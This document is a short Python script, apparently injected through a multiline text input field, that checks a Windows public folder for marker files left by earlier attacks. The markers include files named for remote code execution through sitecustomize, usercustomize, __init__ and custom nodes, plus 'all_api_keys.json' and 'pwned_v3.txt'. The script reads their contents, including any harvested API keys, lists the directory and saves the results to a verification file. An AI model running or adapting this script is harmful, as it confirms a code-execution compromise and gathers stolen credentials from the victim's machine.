inputs.multiline_text:
import os, json
result = {}
files_to_check = [
    "C:/Users/Public/simple_extract_result.json",
    "C:/Users/Public/EXTRACTION_DONE.txt",
    "C:/Users/Public/all_api_keys.json",
    "C:/Users/Public/import_usercustomize_rce.txt",
    "C:/Users/Public/import_sitecustomize_rce.txt",
    "C:/Users/Public/import___init___rce.txt",
    "C:/Users/Public/custom_node_executed.txt",
    "C:/Users/Public/direct_rce.txt",
    "C:/Users/Public/patch_rce.txt",
    "C:/Users/Public/pwned_v3.txt",
]
for fpath in files_to_check:
    if os.path.exists(fpath):
        try:
            with open(fpath, "r", encoding="utf-8") as f:
                result[os.path.basename(fpath)] = f.read()[:1000]
        except Exception as e:
            result[os.path.basename(fpath)] = f"READ_ERROR: {str(e)}"
    else:
        result[os.path.basename(fpath)] = "NOT_FOUND"

# Also list C:/Users/Public for ALL files
try:
    all_files = os.listdir("C:/Users/Public")
    result["ALL_FILES"] = all_files[:100]
except Exception as e:
    result["ALL_FILES"] = f"ERROR: {str(e)}"

with open("C:/Users/Public/VERIFICATION_RESULT.json", "w") as f:
    json.dump(result, f, indent=2)
